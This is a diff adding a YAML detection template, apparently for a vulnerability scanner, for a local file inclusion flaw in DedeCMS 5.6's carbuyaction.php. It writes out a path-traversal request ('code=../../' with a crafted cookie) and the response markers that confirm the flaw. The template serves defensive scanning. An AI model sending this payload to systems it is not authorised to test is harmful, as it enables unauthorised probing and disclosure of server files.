@@ -1,0 +1,24 @@
+id: dedecms-carbuyaction-fileinclude
+brief:
+    title: DedeCmsV5.6 Carbuyaction Fileinclude
+    by: pikpikcu
+    level: high
+    about: A vulnerability in DedeCMS's 'carbuyaction.php' endpoint allows remote attackers to return the content of locally stored files via a vulnerability in the 'code' parameter.
+    label:
+        - dedecms
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/plus/carbuyaction.php?dopost=return&code=../../'
+      head:
+        Cookie: code=cod
+      signs:
+        - "on": word
+          has:
+            - Cod::respond()
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
